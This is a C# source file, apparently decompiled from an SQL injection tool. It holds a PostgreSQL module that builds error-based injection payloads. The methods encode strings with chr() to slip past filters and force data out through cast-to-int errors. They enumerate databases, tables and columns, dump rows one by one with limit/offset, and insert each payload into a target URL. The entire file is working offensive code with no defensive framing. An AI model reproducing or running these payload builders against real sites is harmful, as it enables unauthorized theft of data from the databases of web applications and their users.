using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase;

public class PostgreSQL
{
	private static string string_0;

	private static string string_1;

	private static string string_2;

	public static string Info(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, List<string> lColumn, string sEndUrl = "")
	{
		string text = "";
		string text2 = Class23.smethod_21(Class54.string_0, bool_0: false, "||", "chr");
		string text3 = Class23.smethod_21(Class54.string_2, bool_0: false, "||", "chr");
		text = text2 + "||#||" + text2;
		switch (bError)
		{
		case PostgreSQLErrorType.CAST_INT:
			text = "cast((#) as int)".Replace("#", text);
			break;
		case PostgreSQLErrorType.NONE:
			text = "(" + text + ")";
			break;
		}
		checked
		{
			string newValue;
			if (lColumn.Count == 1)
			{
				newValue = lColumn[0].Trim();
			}
			else
			{
				newValue = "";
				int num = lColumn.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (i > 0)
					{
						newValue = newValue + "||" + text3 + "||";
					}
					newValue += lColumn[i].Trim();
				}
				newValue = newValue;
			}
			text = text.Replace("#", newValue);
			text = Class23.smethod_7(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}
	}

	public static string DataBases(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, bool bCorrentDB, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
	{
		string text = Class23.smethod_21(Class54.string_0, bool_0: false, "||", "chr");
		Class23.smethod_21(Class54.string_2, bool_0: false, "||", "chr");
		string text2 = text + "||#||" + text;
		switch (bError)
		{
		case PostgreSQLErrorType.CAST_INT:
			text2 = "cast((#) as int)".Replace("#", text2);
			break;
		case PostgreSQLErrorType.NONE:
			text2 = "(" + text2 + ")";
			break;
		}
		text2 = ((!bCorrentDB) ? text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct datname from pg_database where datname not like " + Class23.smethod_21("%postgres%", bool_0: false, "||", "chr") + " and datname not like " + Class23.smethod_21("%template%", bool_0: false, "||", "chr"), Interaction.IIf(!string.IsNullOrEmpty(sWhere), " and " + sWhere + " ", " ")), Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), "order by " + sOrderBy + ", [datname] asc ", " ")), "limit 1 offset "), iOFFSET), ")"))) : text2.Replace("#", "(select current_database())"));
		text2 = Class23.smethod_7(text2);
		return sTraject.Replace("[t]", text2) + sEndUrl;
	}

	public static string Tables(string sTraject, InjectionType oMethod, string sDataBase, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
	{
		string text = Class23.smethod_21(Class54.string_0, bool_0: false, "||", "chr");
		Class23.smethod_21(Class54.string_2, bool_0: false, "||", "chr");
		string text2 = text + "||#||" + text;
		switch (bError)
		{
		case PostgreSQLErrorType.CAST_INT:
			text2 = "cast((#) as int)".Replace("#", text2);
			break;
		case PostgreSQLErrorType.NONE:
			text2 = "(" + text2 + ")";
			break;
		}
		text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct table_name from information_schema.tables where table_catalog=" + Class23.smethod_21(sDataBase, bool_0: false, "||", "chr") + " and table_type like chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37) and table_name not like " + Class23.smethod_21("%pg_%", bool_0: false, "||", "chr") + " and table_name not like " + Class23.smethod_21("%sql_%", bool_0: false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), " limit 1 offset "), iOFFSET), ")")));
		text2 = Class23.smethod_7(text2);
		return sTraject.Replace("[t]", text2) + sEndUrl;
	}

	public static string Columns(string sTraject, InjectionType oMethod, string sDataBase, string sTable, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
	{
		string text = Class23.smethod_21(Class54.string_0, bool_0: false, "||", "chr");
		Class23.smethod_21(Class54.string_2, bool_0: false, "||", "chr");
		string text2 = text + "||#||" + text;
		switch (bError)
		{
		case PostgreSQLErrorType.CAST_INT:
			text2 = "cast((#) as int)".Replace("#", text2);
			break;
		case PostgreSQLErrorType.NONE:
			text2 = "(" + text2 + ")";
			break;
		}
		text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select distinct column_name from information_schema.columns where table_catalog=" + Class23.smethod_21(sDataBase, bool_0: false, "||", "chr") + " and table_name=" + Class23.smethod_21(sTable, bool_0: false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), " limit 1 offset "), iOFFSET), ")")));
		text2 = Class23.smethod_7(text2);
		return sTraject.Replace("[t]", text2) + sEndUrl;
	}

	public static string Dump(string sTraject, InjectionType oMethod, string sDataBase, string sTable, List<string> lColumn, PostgreSQLErrorType bError, int iOFFSET, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
	{
		string text = Class23.smethod_21(Class54.string_0, bool_0: false, "||", "chr");
		string text2 = Class23.smethod_21(Class54.string_2, bool_0: false, "||", "chr");
		string text3 = text + "||#||" + text;
		switch (bError)
		{
		case PostgreSQLErrorType.CAST_INT:
			text3 = "cast((#) as int)".Replace("#", text3);
			break;
		case PostgreSQLErrorType.NONE:
			text3 = "(" + text3 + ")";
			break;
		}
		checked
		{
			if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
			{
				string text4;
				if (lColumn.Count == 1)
				{
					text4 = "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[0].Trim()));
				}
				else
				{
					text4 = "";
					int num = lColumn.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text4 = text4 + "||" + text2 + "||";
						}
						text4 += "coalesce(#, chr(32))".Replace("#", "cast(# as text)".Replace("#", lColumn[i].Trim()));
					}
					text4 = text4;
				}
				text3 = text3.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text4 + " from " + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " order by " + sOrderBy)), " limit 1 offset "), iOFFSET), ")")));
			}
			else
			{
				text3 = text3.Replace("#", sCustomQuery);
				if (text3.Contains("[s]"))
				{
					text3 = text3.Replace("[s]", "||" + text2 + "||");
				}
				text3 = text3.Replace("[x]", Conversions.ToString(iOFFSET));
			}
			text3 = Class23.smethod_7(text3);
			return sTraject.Replace("[t]", text3) + sEndUrl;
		}
	}

	public static string Count(string sTraject, InjectionType oMethod, PostgreSQLErrorType bError, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
	{
		string text = Class23.smethod_21(Class54.string_0, bool_0: false, "||", "chr");
		Class23.smethod_21(Class54.string_2, bool_0: false, "||", "chr");
		string text2 = text + "||#||" + text;
		switch (bError)
		{
		case PostgreSQLErrorType.CAST_INT:
			text2 = "cast((#) as int)".Replace("#", text2);
			break;
		case PostgreSQLErrorType.NONE:
			text2 = "(" + text2 + ")";
			break;
		}
		switch (o)
		{
		case Schema.DATABASES:
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from pg_database where datname not like " + Class23.smethod_21("%postgres%", bool_0: false, "||", "chr") + " and datname not like " + Class23.smethod_21("%template%", bool_0: false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
			break;
		case Schema.TABLES:
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from information_schema.tables where table_catalog=" + Class23.smethod_21(sDataBase, bool_0: false, "||", "chr") + " and table_type like chr(37)||chr(66)||chr(65)||chr(83)||chr(69)||chr(32)||chr(84)||chr(65)||chr(66)||chr(76)||chr(69)||chr(37) and table_name not like " + Class23.smethod_21("%pg_%", bool_0: false, "||", "chr") + " and table_name not like " + Class23.smethod_21("%sql_%", bool_0: false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
			break;
		case Schema.COLUMNS:
			text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from information_schema.columns where table_catalog=" + Class23.smethod_21(sDataBase, bool_0: false, "||", "chr") + " and table_name=" + Class23.smethod_21(sTable, bool_0: false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")")));
			break;
		case Schema.ROWS:
			text2 = ((!string.IsNullOrEmpty(sTable)) ? text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select count(*) from " + sTable, Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"))) : text2.Replace("#", "(" + sDataBase + ")"));
			break;
		}
		text2 = Class23.smethod_7(text2);
		return sTraject.Replace("[t]", text2) + sEndUrl;
	}
}
